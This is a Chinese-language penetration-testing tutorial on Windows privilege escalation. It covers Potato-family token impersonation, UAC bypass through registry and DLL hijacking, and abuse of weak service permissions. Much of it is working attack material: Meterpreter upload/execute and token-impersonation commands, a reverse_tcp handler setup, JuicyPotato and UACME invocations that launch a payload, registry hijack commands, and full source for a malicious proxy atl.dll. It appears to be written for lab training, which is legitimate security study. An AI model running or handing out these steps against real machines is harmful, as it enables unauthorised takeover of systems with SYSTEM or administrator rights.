Potato 家族正是通过滥用 Windows 服务账户拥有的这两项特权，

将已获取的 `NTAUTHORITY\SYSTEM` 账户的访问令牌传入`CreateProcessWithTokenW`或 `CreateProcessAsUserA` 函数进行调用，从而在`NT AUTHORITY\SYSTEM` 账户的上下文中**创建新进程**，以提升至**SYSTEM权限**。

在实战场景中，若成功拿到了`IIS`等服务的 `WebShell` 或者通过 `MSSQL` 服务的 `Xp_cmdshell` 成功执行了系统命令，此时获取的服务账户拥有 `SelmpersonatePrivilege` 和 `SeAssignPrimaryTokenPrivilege` 特权，就可以通过Potato 家族提升至 SYSTEM 权限。

#### 3.3.1.Rotten Potato

gethub：https://github.com/foxglovesec/RottenPotato

```python
cd /root/tools/windows
git clone https://github.com/foxglovesec/RottenPotato.git
```

![image-20241009150945520](https://image.201068.xyz/assets/38.后渗透/image-20241009150945520.png)

`Rotten Potato` 即 “**烂土豆**”，可以用来将已获取的**服务账户权限**提升至 `SYSTEM`权限。

##### Rotten Potato 提权步骤

`Rotten Potato` 提权的实现机制相当复杂，拦截 NTLM 身份认证请求，并伪造`NT AUTHORITY\SYSTEM` 账户的访问令牌，大致可以分为以下三个步骤。

①通过 `CoGetlnstanceFromIStorage API`，将一个COM对象 (`BITS`) 加载到本地可控的端口（`TCP 6666`)，并诱骗 BITS 对象以 `NT AUTHORITY\SYSTEM` 账户的身份向该端口发起 NTLM 认证。

②借助本地`RPC135`端口，对BITS对象的认证过程执行中间人攻击(NTLM Relay)，同时调用相关 API 为 `NTAUTHORITY\SYSTEM` 账户在本地生成一个访问令牌。

③通过 `NTAUTHORITY\SYSTEM` 账户的令牌创建新进程，以获取SYSTEM权限。

##### 实验演示

假设已通过 `MetaSploit` 获取了**低权限**

![image-20241009152006261](https://image.201068.xyz/assets/38.后渗透/image-20241009152006261.png)

###### 看到账户拥有特权

执行下列命令可以看到当前账户拥有  `SelmpersonatePrivilege` 特权

```python
shell
chcp 65001
whoami /priv
```

![image-20241009152051286](https://image.201068.xyz/assets/38.后渗透/image-20241009152051286.png)

通过 WebShell 上线 MetaSploit，此时加载 `incognito` 模块还**不能列举出高权限用户的令牌**

###### 上传利用程序

向目标主机**上传Rotten Potato的利用程序**（实战中需注意目录权限），并通过以下命令在 Meterpreter 中运行

```python
exit
upload /root/tools/windows/RottenPotato/rottenpotato.exe

execute -Hc -f rottenpotato.exe
```

![image-20241009152326898](https://image.201068.xyz/assets/38.后渗透/image-20241009152326898.png)

![image-20241009162852958](https://image.201068.xyz/assets/38.后渗透/image-20241009162852958.png)

###### 举出令牌

运行 `RottenPotato.exe` 后，再次执行下列命令，就能成功列举出`NTAUTHORITY\SYSTEM`账户的令牌。

```python
load incognito
list_tokens -u
```

![image-20241009162734875](https://image.201068.xyz/assets/38.后渗透/image-20241009162734875.png)

###### 伪造该令牌

然后使用 `impersonate_token` 伪造该令牌，即可获取SYSTEM权限

```python
impersonate_token "NT AUTHORITY\SYSTEM"
```



```python
getsystem
```

![image-20241009163616270](https://image.201068.xyz/assets/38.后渗透/image-20241009163616270.png)

#### 3.3.2.Juicy Potato

https://github.com/ohpe/juicy-potato

下载连接：https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe

```python
cd /root/tools/windows/
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```

Juicy Potato 与 Rotten Potato 的原理几乎完全相同，只是在后者的基础上做了扩展，以便更灵活利用 Rotten Potato。Juicy Potato 不再像 Rotten Potato 那样依赖于一个现有的Meterpreter，并且可以自定义 COM 对象加载的端口，以及根据系统版本更换可用的COM对象

##### 演示

假设已通过 `MetaSploit` 获取了**低权限**。

![image-20241009164126096](https://image.201068.xyz/assets/38.后渗透/image-20241009164126096.png)

#####  ①上传利用程序

上传 JuicyPotato 的利用程序，并根据操作系统版本选择一个可用的COM对象。

```python
upload /root/tools/windows/JuicyPotato.exe
```

![image-20241009164504705](https://image.201068.xyz/assets/38.后渗透/image-20241009164504705.png)

在Rotten Potato 中使用的 COM 对象为BITS，而Juicy Potato为不同 Windows 版本提供了多个可以利用的COM对象，

详细列表请参考（https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md）。

#####  ②运行JuicyPotato

运行JuicyPotato，将获取 SYSTEM 权限并运行指定的攻击载荷（先使用**MetaSploit**监听）

###### **MetaSploit**监听

```python
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.70.4
set lport 8888
exploit
```

![image-20241009164633835](https://image.201068.xyz/assets/38.后渗透/image-20241009164633835.png)

###### 运行JuicyPotato

https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2012_Datacenter

![image-20241009165348720](https://image.201068.xyz/assets/38.后渗透/image-20241009165348720.png)



```python
shell
chcp 65001
JuicyPotato.exe -t t -p C:\phpstudy_pro\WWW\vul\rce\msf_8888.exe -l 8888 -n 135 -c {e60687f7-01a1-40aa-86ac-db1cbf673334}

# -t，指定要使用CreateProcesswithTokenW和CreateProcessAsUserA()中的哪个函数
# -p，指定要运行的程序
# -l，指定COM对象加载的端口
# -n，指定本地RPC服务端口，默认为135
# -c，指定要加载的COM对象的CLSID
```

![image-20241009165411562](https://image.201068.xyz/assets/38.后渗透/image-20241009165411562.png)

注意，以上提权方法仅适用于 `Windows 10 version 1809` 和 `Windows Server 2019` 之前版本的系统。

在之后的版本中，微软通过检查RPC绑定字符串中指定的端口来修复了这个问题，修复后的系统无法通过原来的方法实现中间人攻击。

###### 成功获取

成功获取到了一个 SYSTEM 权限的Meterpreter

```python
getuid
```

![image-20241009165514740](https://image.201068.xyz/assets/38.后渗透/image-20241009165514740.png)

#### 3.3.3.PrintSpoofer (Pipe Potato)

https://github.com/itm4n/PrintSpoofer

下载链接：https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe

```python
cd /root/tools/windows/
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
```

2020年5月，安全研究员 Clement Labro 发布了有关 PrintSpoofer（也被称为“Pipe Potato”）

提权技术的细节，主要利用了打印机组件路径检查中存在的一个Bug，使高权限的服务能连接到我们创建的命名管道，以获取高权限账户的令牌来创建新进程。

##### 演示

以 **IIS 服务**进行演示，假设已获取 **IIS 服务账户**的权限，上线了 `MetaSploit`

![image-20241009170726503](https://image.201068.xyz/assets/38.后渗透/image-20241009170726503.png)

##### 上传利用程序

然后向目标主机上传 `Pipe Potato` 的利用程序

```python
upload /root/tools/windows/PrintSpoofer64.exe
```

![image-20241009170944874](https://image.201068.xyz/assets/38.后渗透/image-20241009170944874.png)

##### 运行利用程序

在 Shell 中直接运行将会以 SYSTEM 权限执行命令。

```python
shell
chcp 65001
PrintSpoofer64.exe -i -c whoami
```

![image-20241009171018255](https://image.201068.xyz/assets/38.后渗透/image-20241009171018255.png)

## 四.Bypass UAC

用户账户控制 (User Account Control，UAC) 是 Windows 操作系统采用的一种控制机制，可以阻止自动安装未经授权的应用并防止意外更改系统设置，有助于防止恶意软件损坏计算机。

用户账户控制使应用程序和任务始终在非管理员账户的安全上下文中运行.除非管理员专门授予管理员级别的权限。

开启用户账户控制后，每个需要使用管理员访问令牌的应用都必须提示征得用户同意。

UAC 限制所有 `RID 非 500` 的管理员用户使用标准用户登录到他们的计算机，并在标准用户的安全性上下文中访问资源和运行应用。

这里所说的非 RID 500 的用户是指除 `Administrator`以外,位于管理员组中的其他管理员用户。

当非 RID 500 的管理员用户登录后，系统会为其创建两个单独的访问令牌：标准用户访问令牌和管理员访问令牌。标准用户访问令牌包含与管理员访问令牌相同的用户特定信息，只是移除了 Windows 管理特权和相关SID。

标准用户访问令牌用于启动不执行管理任务的应用程序（标准用户应用程序）。

当管理员需要执行高权限管理任务时，Windows 会自动提示用户予以批准，同意后则允许使用管理员访问令牌。

在实战中，如果我们可以绕过 Windows UAC 机制，**使非 RID 500 的管理员账户可以不需用户批准直接使用管理员访问令牌**，从而获得全部的管理权限。

### 4.1.UAC白名单

微软在用户账户控制中为一些系统程序设置了白名单机制，所有白名单中的程序将不再询问，以静

默方式自动提升到管理员权限运行，如 `slui.exe,wusa.exe,taskmgr.exe,msra.exe,eudcedit.exe,eventvwr.exe,CompMgmtLauncher.exe, rundll32.exe,explorer.exe`等。

我们可以通过对这些白名单程序进行DLL 劫持或者注册表劫持等，绕过UAC并提升权限。

在寻找**白名单程序**时，可以使用微软官方提供的工具 

白名单程序拥有一个共同的特性，就是 Manifest 数据中 `autoElevate` 属性的值为 `True`。

`Sigcheck` 可以检测程序是否具有 `autoElevate` 属性

#### Sigcheck

https://learn.microsoft.com/zh-cn/sysinternals/downloads/sigcheck

下载链接：https://download.sysinternals.com/files/Sigcheck.zip

#### Strings

https://learn.microsoft.com/en-us/sysinternals/downloads/strings

下载链接：https://download.sysinternals.com/files/Strings.zip

#### 演示

以 `ComputerDefaults.exe` 为例，该程序位于`C:\Windows\System32` 目录下

```python
sigcheck.exe /accepteula -m C:\Windows\System32\ComputerDefaults.exe
```

![image-20241009172835082](https://image.201068.xyz/assets/38.后渗透/image-20241009172835082.png)

![image-20241009172918371](https://image.201068.xyz/assets/38.后渗透/image-20241009172918371.png)

Strings 可以找出所有具有 `autoElevate` 属性的程序

```python
strings.exe /accepteula -s C:\Windows\System32\*.exe | findstr /i "autoElevate"
```

![image-20241009173256318](https://image.201068.xyz/assets/38.后渗透/image-20241009173256318.png)

#### 进行分析

下面以 ComputerDefaults.exe 为例进行分析，并通过该程序绕过UAC 实现提权。

ComputerDefaults.exe 运行后会打开 Windows的默认应用。

①直接到 System32 目录下运行 ComputerDefaults.exe 程序，打开“**默认应用**”界面，并未出现UAC弹窗

②使用进程监控器 process monitor 监控 `ComputerDefaults.exe` 进程的所有操作行为，可以发现 ComputerDefaults.exe 进程会先查询注册表 `HKCU\Software\Classes\ms-settings\shell\open\command` 中的数据，

发现该路径不存在后，继续查询注册表 `HKCR\ms-settings\Shell\Open\Command\DelegateExecute` 中的数据并读取

通常情况下，以“`shell\open\command`”命名的注册表中存储的是可执行文件的路径，程序会读取其中的键值并运行相应的可执行文件。

由于`ComputerDefaults.exe` 是**UAC白名单中的程序**，运行时默认提升了权限，因此在运行该键值中的可执行文件时默认为管理员权限。

③执行以下命令，在注册表 `HKCU\Software\Classes\ms-settings\shellopen\command`（如果没有就创建）中将要执行的攻击载荷路径分别写入“默认”值和“`DelegateExecute`”值（这里写入的是 cmd 的路径)  

```python
shell
chcp 65001
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "C:\windows\system32\cmd.exe" /f
  
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
```

> 注：**标准用户对该注册表键值有修改权限**，并且对`HKCU`的修改会**自动同步**到`HKCR`。

![image-20241009190658086](https://image.201068.xyz/assets/38.后渗透/image-20241009190658086.png)

### 4.2 DLL劫持与模拟可信任目录

#### DLL劫持

Windows系统中的很多应用程序并不是一个完整的可执行文件，被分割成一些相对独立的动态链接库文件（DLL文件），这些文件中包含程序运行时所使用的代码和数据。当程序启动时，相应的 DLL 文件会被加载到程序进程的内存空间。

我们可以通过一些手段，欺骗合法的.受信任的程序加载任意的 DLL 文件，从而造成 DLL 劫持。

当应用程序加载 DLL 时，如果没有指定 DLL 的绝对路径；那么程序会以特定的顺序依次在指定路径下搜索待加载的DLL。

在**开启安全 DLL 搜索模式**（Windows XP SP2后默认开启）的情况下，将按以下顺序进行搜索：

程序安装目录→系统目录（C:\Windows\System32）→ 16位系统目录（C:\Windows\System）→ Windows目录（C:\Windows）→ 当前工作目录 → PATH环境变量中列出的各目录。

如果将**同名的恶意 DLL 文件放在合法 DLL 文件所在路径之前的搜索位置**，当应用程序搜索 DLL 时，就会以恶意 DLL 代替合法的 DLL 来加载。

这就是 DLL 预加载劫持情景，利用的前提是拥有对上述目录的写入权限，并且恶意 DLL 需要与原始 DLL 拥有相同的导出表函数。

我们可以通过 DLL 劫持技术来执行攻击载荷，通常是为了实现权限的持久化。

但是，如果加载DLL文件的应用程序是在提升的权限下运行，那么其加载的 DLL 文件也将在相同的权限下运行，因此 DLL 劫持也可以实现权限提升。

基于上述原理，通过劫持 UAC 白名单程序所加载的 DLL 文件，我们就可以借助白名单程序的自动提升权限来 Bypass UAC。但是，这些白名单程序所加载的 DLL 文件几乎都位于系统可信任目录中，而这些目录对标准用户来说通常都是不可写的。

因此，接下来我们学习模拟可信任目录的内容。

#### 1.模拟可信任目录

白名单程序都拥有一个共同的特性，就是 Manifest 数据中 autoElevate 属性的值为 True。

当启动的程序请求自动提升权限时，系统会先读取其可执行文件的 Manifest 信息，解析 `autoElevate` 属性字段的值。

- 如果`autoElevate`字段存在并且值为 `True`，就会认为这是一个**可以自动提升权限的可执行文件**。
- 并且，系统会**检查可执行文件的签名**，这意味着无法通过构造 Manifest 信息或冒充可执行文件名来实现自动权限提升。
- 此外，系统会**检查可执行文件是否位于系统可信任目录**中，如 `C:\Windows\System32` 目录。

当这三个条件全部通过后，则允许程序自动提升权限，有任意一个条件不通过都会被系统拒绝。

当系统在检查可信任目录时，**相关函数会自动去掉可执行文件路径中的空格**。

如果可执行文件位于 “`C:\Windows \System32`” 目录（注意：在“Windows”后有**一个空格**）中，系统在检查时会自动去除路径中的空格，这样就通过了最后一个条件的检查。

##### 创建可信任目录

基于此原理，我们可以根据可信任目录来**创建一个末尾包含空格的模拟可信任目录**，

**将一个白名单程序复制到模拟可信任目录**中，配合 **DLL 劫持**等技术即可成功绕过 UAC 。

![image-20241009191916746](https://image.201068.xyz/assets/38.后渗透/image-20241009191916746.png)

```python
md "\\?\c:\Windows "
md "\\?\C:\Windows \System32"
copy "C:\Windows\System32\perfmon.exe" "\\?\C:\Windows \System32\perfmon.exe"

C:\"Windows "\System32\perfmon.exe
```

![image-20241009191807238](https://image.201068.xyz/assets/38.后渗透/image-20241009191807238.png)

![image-20241009192052824](https://image.201068.xyz/assets/38.后渗透/image-20241009192052824.png)

![image-20241009192036896](https://image.201068.xyz/assets/38.后渗透/image-20241009192036896.png)

![image-20241009192022209](https://image.201068.xyz/assets/38.后渗透/image-20241009192022209.png)

#### 2.进程监视器

- `ProcessMonitor-v3.91-Chs.exe`

**运⾏模拟可信任⽬录**中的 `perfmon.exe` 

使⽤**进程监视器监控** `perfmon.exe` 进程的**⽂件活动**信息

![image-20241009211837089](https://image.201068.xyz/assets/38.后渗透/image-20241009211837089.png)

#### 3.对DLL进⾏劫持

观察⽂件活动情况，发现 perfmon.exe 尝试加载 `C:\Windows \System32\ATL.DLL` 时提示**未找到名称**，

说明perfmon.exe 需要加载 `ATL.DLL` 来运⾏，所以尝试对 ATL.DLL 进⾏劫持

![image-20241009212536251](https://image.201068.xyz/assets/38.后渗透/image-20241009212536251.png)

#### 4.AheadLib导出

`atl.dll` ⽂件位于 `C:\Windows\System32` ⽬录中，这⾥使⽤ `AheadLib` 导出 `atl.dll` 的**导出表**cpp，设置完成后点击⽣成即可

![image-20241009213118919](https://image.201068.xyz/assets/38.后渗透/image-20241009213118919.png)

![image-20241009222140919](https://image.201068.xyz/assets/38.后渗透/image-20241009222140919.png)

![image-20241009222218880](https://image.201068.xyz/assets/38.后渗透/image-20241009222218880.png)

#### 5.创建dll项⽬

打开 `Visual Studio` 按照下图所示新建⼀个 dll 项⽬

![image-20241009213557726](https://image.201068.xyz/assets/38.后渗透/image-20241009213557726.png)

![image-20241009213704257](https://image.201068.xyz/assets/38.后渗透/image-20241009213704257.png)

![image-20241009213818733](https://image.201068.xyz/assets/38.后渗透/image-20241009213818733.png)

![image-20241009220258275](https://image.201068.xyz/assets/38.后渗透/image-20241009220258275.png)

#### 6.调用`cpp`⽂件

将⽣成的 `cpp` ⽂件内容粘贴到 Visual Studio 中，然后在下图所示位置添加相关内容

![image-20241009222309549](https://image.201068.xyz/assets/38.后渗透/image-20241009222309549.png)

![image-20241009222345898](https://image.201068.xyz/assets/38.后渗透/image-20241009222345898.png)

```cpp



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 头文件
#include <Windows.h>
#include "pch.h"
#include <stdlib.h>
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 导出函数
#pragma comment(linker, "/EXPORT:AtlAdvise=atlOrg.AtlAdvise,@10")
#pragma comment(linker, "/EXPORT:AtlUnadvise=atlOrg.AtlUnadvise,@11")
#pragma comment(linker, "/EXPORT:AtlFreeMarshalStream=atlOrg.AtlFreeMarshalStream,@12")
#pragma comment(linker, "/EXPORT:AtlMarshalPtrInProc=atlOrg.AtlMarshalPtrInProc,@13")
#pragma comment(linker, "/EXPORT:AtlUnmarshalPtr=atlOrg.AtlUnmarshalPtr,@14")
#pragma comment(linker, "/EXPORT:AtlModuleGetClassObject=atlOrg.AtlModuleGetClassObject,@15")
#pragma comment(linker, "/EXPORT:AtlModuleInit=atlOrg.AtlModuleInit,@16")
#pragma comment(linker, "/EXPORT:AtlModuleRegisterClassObjects=atlOrg.AtlModuleRegisterClassObjects,@17")
#pragma comment(linker, "/EXPORT:AtlModuleRegisterServer=atlOrg.AtlModuleRegisterServer,@18")
#pragma comment(linker, "/EXPORT:AtlModuleRegisterTypeLib=atlOrg.AtlModuleRegisterTypeLib,@19")
#pragma comment(linker, "/EXPORT:AtlModuleRevokeClassObjects=atlOrg.AtlModuleRevokeClassObjects,@20")
#pragma comment(linker, "/EXPORT:AtlModuleTerm=atlOrg.AtlModuleTerm,@21")
#pragma comment(linker, "/EXPORT:AtlModuleUnregisterServer=atlOrg.AtlModuleUnregisterServer,@22")
#pragma comment(linker, "/EXPORT:AtlModuleUpdateRegistryFromResourceD=atlOrg.AtlModuleUpdateRegistryFromResourceD,@23")
#pragma comment(linker, "/EXPORT:AtlWaitWithMessageLoop=atlOrg.AtlWaitWithMessageLoop,@24")
#pragma comment(linker, "/EXPORT:AtlSetErrorInfo=atlOrg.AtlSetErrorInfo,@25")
#pragma comment(linker, "/EXPORT:AtlCreateTargetDC=atlOrg.AtlCreateTargetDC,@26")
#pragma comment(linker, "/EXPORT:AtlHiMetricToPixel=atlOrg.AtlHiMetricToPixel,@27")
#pragma comment(linker, "/EXPORT:AtlPixelToHiMetric=atlOrg.AtlPixelToHiMetric,@28")
#pragma comment(linker, "/EXPORT:AtlDevModeW2A=atlOrg.AtlDevModeW2A,@29")
#pragma comment(linker, "/EXPORT:AtlComPtrAssign=atlOrg.AtlComPtrAssign,@30")
#pragma comment(linker, "/EXPORT:AtlComQIPtrAssign=atlOrg.AtlComQIPtrAssign,@31")
#pragma comment(linker, "/EXPORT:AtlInternalQueryInterface=atlOrg.AtlInternalQueryInterface,@32")
#pragma comment(linker, "/EXPORT:DllCanUnloadNow=atlOrg.DllCanUnloadNow,@33")
#pragma comment(linker, "/EXPORT:AtlGetVersion=atlOrg.AtlGetVersion,@34")
#pragma comment(linker, "/EXPORT:AtlAxDialogBoxW=atlOrg.AtlAxDialogBoxW,@35")
#pragma comment(linker, "/EXPORT:AtlAxDialogBoxA=atlOrg.AtlAxDialogBoxA,@36")
#pragma comment(linker, "/EXPORT:AtlAxCreateDialogW=atlOrg.AtlAxCreateDialogW,@37")
#pragma comment(linker, "/EXPORT:AtlAxCreateDialogA=atlOrg.AtlAxCreateDialogA,@38")
#pragma comment(linker, "/EXPORT:AtlAxCreateControl=atlOrg.AtlAxCreateControl,@39")
#pragma comment(linker, "/EXPORT:AtlAxCreateControlEx=atlOrg.AtlAxCreateControlEx,@40")
#pragma comment(linker, "/EXPORT:AtlAxAttachControl=atlOrg.AtlAxAttachControl,@41")
#pragma comment(linker, "/EXPORT:AtlAxWinInit=atlOrg.AtlAxWinInit,@42")
#pragma comment(linker, "/EXPORT:AtlModuleAddCreateWndData=atlOrg.AtlModuleAddCreateWndData,@43")
#pragma comment(linker, "/EXPORT:AtlModuleExtractCreateWndData=atlOrg.AtlModuleExtractCreateWndData,@44")
#pragma comment(linker, "/EXPORT:AtlModuleRegisterWndClassInfoW=atlOrg.AtlModuleRegisterWndClassInfoW,@45")
#pragma comment(linker, "/EXPORT:AtlModuleRegisterWndClassInfoA=atlOrg.AtlModuleRegisterWndClassInfoA,@46")
#pragma comment(linker, "/EXPORT:AtlAxGetControl=atlOrg.AtlAxGetControl,@47")
#pragma comment(linker, "/EXPORT:AtlAxGetHost=atlOrg.AtlAxGetHost,@48")
#pragma comment(linker, "/EXPORT:AtlRegisterClassCategoriesHelper=atlOrg.AtlRegisterClassCategoriesHelper,@49")
#pragma comment(linker, "/EXPORT:AtlIPersistStreamInit_Load=atlOrg.AtlIPersistStreamInit_Load,@50")
#pragma comment(linker, "/EXPORT:AtlIPersistStreamInit_Save=atlOrg.AtlIPersistStreamInit_Save,@51")
#pragma comment(linker, "/EXPORT:AtlIPersistPropertyBag_Load=atlOrg.AtlIPersistPropertyBag_Load,@52")
#pragma comment(linker, "/EXPORT:AtlIPersistPropertyBag_Save=atlOrg.AtlIPersistPropertyBag_Save,@53")
#pragma comment(linker, "/EXPORT:AtlGetObjectSourceInterface=atlOrg.AtlGetObjectSourceInterface,@54")
#pragma comment(linker, "/EXPORT:AtlModuleUnRegisterTypeLib=atlOrg.AtlModuleUnRegisterTypeLib,@55")
#pragma comment(linker, "/EXPORT:AtlModuleLoadTypeLib=atlOrg.AtlModuleLoadTypeLib,@56")
#pragma comment(linker, "/EXPORT:AtlModuleUnregisterServerEx=atlOrg.AtlModuleUnregisterServerEx,@57")
#pragma comment(linker, "/EXPORT:AtlModuleAddTermFunc=atlOrg.AtlModuleAddTermFunc,@58")
#pragma comment(linker, "/EXPORT:AtlSetErrorInfo2=atlOrg.AtlSetErrorInfo2,@59")
#pragma comment(linker, "/EXPORT:AtlIPersistStreamInit_GetSizeMax=atlOrg.AtlIPersistStreamInit_GetSizeMax,@60")
#pragma comment(linker, "/EXPORT:DllGetClassObject=atlOrg.DllGetClassObject,@61")
#pragma comment(linker, "/EXPORT:DllRegisterServer=atlOrg.DllRegisterServer,@62")
#pragma comment(linker, "/EXPORT:DllUnregisterServer=atlOrg.DllUnregisterServer,@63")
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 入口函数
BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
{
	if (dwReason == DLL_PROCESS_ATTACH)
	{
		system("start cmd.exe");
		DisableThreadLibraryCalls(hModule);
	}
	else if (dwReason == DLL_PROCESS_DETACH)
	{
	}

	return TRUE;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

```



```c++
#include "pch.h"
#include <stdlib.h>

system("start cmd.exe");
```

![image-20241009222443799](https://image.201068.xyz/assets/38.后渗透/image-20241009222443799.png)

![image-20241009222426548](https://image.201068.xyz/assets/38.后渗透/image-20241009222426548.png)

#### 7.⽣成 dll ⽂件

按照下图所示设置后点击 **⽣成—>⽣成解决⽅案**，即可⽣成 dll ⽂件

![image-20241009224032197](https://image.201068.xyz/assets/38.后渗透/image-20241009224032197.png)

![image-20241009224221312](https://image.201068.xyz/assets/38.后渗透/image-20241009224221312.png)

![image-20241009222600284](https://image.201068.xyz/assets/38.后渗透/image-20241009222600284.png)

#### 8.放入文件

根据提示找到⽣成的 dll ⽂件，将 dll ⽂件复制到创建的**模拟可信任⽬录当中**，

然后将⽣成的**恶意⽂件**重命名为`atl.dll`

并且将 `C:\Windows\System32\atl.dll`⽂件也复制到创建的模拟可信任⽬录当中，并且**原始 DLL 名称**重命名为 `atlOrg.dll` 

![image-20241009222655504](https://image.201068.xyz/assets/38.后渗透/image-20241009222655504.png)

#### 9.验证

双击 `perfmon.exe` 会弹出**绕过 UAC 的 cmd** ，可以在该 cmd 中执⾏ `whoami /priv` 进⾏验证

```python
whoami /priv
```

![image-20241009222906746](https://image.201068.xyz/assets/38.后渗透/image-20241009222906746.png)

#### UAC提权工具

UACME 是一个专用于绕过Windows UAC的开源项目，目前已包含了70多种Bypass UAC的方法

```python
akagi.exe [Key] [Param]

.\Akagi.exe 41 C:\phpstudy_pro\WWW\vul\rce\msf_8888.exe

#Key，指定要使用的方法的编号
#Param，指定绕过UAC后要运行的程序或命令，默认启动一个关闭了UAC的CMD窗口
```

##### 下载

github：https://github.com/hfiref0x/UACME

```python
git clone https://github.com/hfiref0x/UACME.git
```

![image-20241009193655317](https://image.201068.xyz/assets/38.后渗透/image-20241009193655317.png)

##### 编译

在UACME 项目中，每种 `Bypass UAC`的方法都有一个数字编号，由一个名为 `Akagi.exe`（需要自行编译生成）的主程序进行统一调用，相关命令如下

![image-20241009194100176](https://image.201068.xyz/assets/38.后渗透/image-20241009194100176.png)

> `E:\learn\Penetration-tools\0.分类\5.后渗透\UACME\Source\Akagi\output\x64\Debug\Akagi.exe`

![image-20241009194216720](https://image.201068.xyz/assets/38.后渗透/image-20241009194216720.png)

##### 上传到靶机

![image-20241009194945268](https://image.201068.xyz/assets/38.后渗透/image-20241009194945268.png)

##### 监听

```python
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.70.4
set lport 8888
run
```

![image-20241009195308820](https://image.201068.xyz/assets/38.后渗透/image-20241009195308820.png)

##### 已有权限的会话运行

```python
shell
chcp 65001
cd Debug
Akagi.exe 41 C:\phpstudy_pro\WWW\vul\rce\msf_8888.exe
```

![image-20241009195542273](https://image.201068.xyz/assets/38.后渗透/image-20241009195542273.png)

###### Visual C++ Redistributable for Visual Studio 2015

https://www.microsoft.com/zh-cn/download/details.aspx?id=48145

https://download.microsoft.com/download/9/3/F/93FCF1E7-E6A4-478B-96E7-D4B285925B00/vc_redist.x64.exe

## 五.系统服务提权

通常情况下，用户安装的一些应用软件会在本地注册一些服务，并且大多数服务在计算机开机时以系统SYSTEM权限启动。应用软件在注册服务时，会在以下路径中创建相应的注册表项。

```python
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services
```

下图为 phpStudySrv 服务得注册表信息，其中的 ImagePath 键指向该系统服务所启动的二进制程序。

Windows 系统服务在操作系统启动时运行，并在后台调用其相应的二进制文件，如上图中的 phpStudySrv.exe 。

由于大多数系统服务是以系统权限（SYSTEM）启动的，如果让服务启动时执行其他程序，该程序就可以随着服务的启动获得系统权限，这是利用系统服务提权的主要思路。

系统服务类提权从主观上可以归咎于用户的配置疏忽或操作错误，如不安全的服务权限.服务注册表权限脆弱.服务路径权限可控.未引用的服务路径等。

### 5.1.不安全的服务权限

ACL定义了安全对象的访问控制策略，用于规定哪些主体对其拥有访问权限和拥有什么样的权限。

Windows 的系统服务正是通过ACL来指定用户对其拥有的权限，常见的权限如下图所示。

```python
权限						说明

SERVICE_START              启动服务的权限

SERVICE_STOP               停止服务的权限

SERVICE_PAUSE_CONTINUE     暂停/继续运行服务的权限

SERVICE_QUERY_STATUS        查询服务状态的权限

SERVICE_QUERY_CONFIG        查询服务配置的权限


SERVICE_CHANGE_CONFIG       更改服务配置的权限

SERVICE_ALL_ACCESS          完全控制权限
```

假设目标主机的用户在配置服务时存在疏忽，使得低权限用户对高权限下运行的系统服务拥有更改

服务配置的权限（`SERVICE_CHANGE_CONFIG` 或 `SERVICE_ALL_ACCESS`)，就可以通过这个低权限用户直接修改服务启动时的二进制文件路径。

#### AccessChk

https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk

下载链接：https://download.sysinternals.com/files/AccessChk.zip

工具可以**枚举目标主机上存在权限缺陷的系统服务**。

AccessChk 是微软官方提供的管理工具，常用**来枚举或查看系统中指定用户组对特定资源**（包括但不限于文件，文件夹，注册表，全局对象和系统服务等）的**访问权限**。

低权限用户可以检查 “`Authenticated Users`” 组和 “`INTERACTIVE`” 组对系统服务的权限。

- 前者为经过身份验证的用户，包含系统中所有使用用户名.密码登录并通过身份验证的账户，但不包括来宾账户；
- 后者为交互式用户组，包含系统中所有直接登录到计算机进行操作的用户。

默认情况下，这两个组为计算机本地“`Users`”组的成员。

#### 漏洞环境设计

在靶机执行，用来设置漏洞环境，实际环境无需这一步

##### Subinacl

是微软提供的用于对文件，注册表，服务等对象进行权限管理的工具软件，我们利用该工具来**分配一些权限**

下载链接：https://pan.baidu.com/s/1mIQMfQMXrPXlBh3G17B0LQ提取码：fcjy  

```python
subinacl.exe /service phpstudysrv /grant="Authenticated Users"=W
```

![image-20241010091454852](https://image.201068.xyz/assets/38.后渗透/image-20241010091454852.png)

#### 漏洞复现

##### ① 枚举权限

执行命令，枚举目标主机**“`Authenticated Users`”组**是否具有更改服务配置的权限

```python
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
```

![image-20241010091634914](https://image.201068.xyz/assets/38.后渗透/image-20241010091634914.png)

为了确保创建安全的环境，Windows 管理员通常需要了解特定用户或用户组对文件，目录，注册表项和 Windows 服务等资源具有哪种访问权限。

AccessChk能够通过直观的界面和输出快速回答这些问题。

| 参数          | 说明                                                         |
| :------------ | :----------------------------------------------------------- |
| **-a**        | 名称是 Windows 帐户权限。 指定 `"*"` 为名称以显示分配给用户的所有权限。 请注意，指定特定权限时，仅显示直接分配给此权限的组和帐户。 |
| **-c**        | 名称是 Windows 服务，例如 `ssdpsrv`。 指定 `"*"` 作为名称，以显示所有服务和 `scmanager`，检查服务控制管理器的安全性。 |
| **-d**        | 仅进程目录或顶级键                                           |
| **-e**        | 令显示明确设置的完整性级别（Windows Vista 以及更高级别）     |
| **-f**        | 如果遵循 `-p`，则显示包括组和权限在内的进程令牌完整信息。 否则是由逗号分隔的帐户列表，用于从输出进行筛选。 |
| **-h**        | 名称是文件或打印机共享。 将 `"*"` 指定为显示所有共享的名称。 |
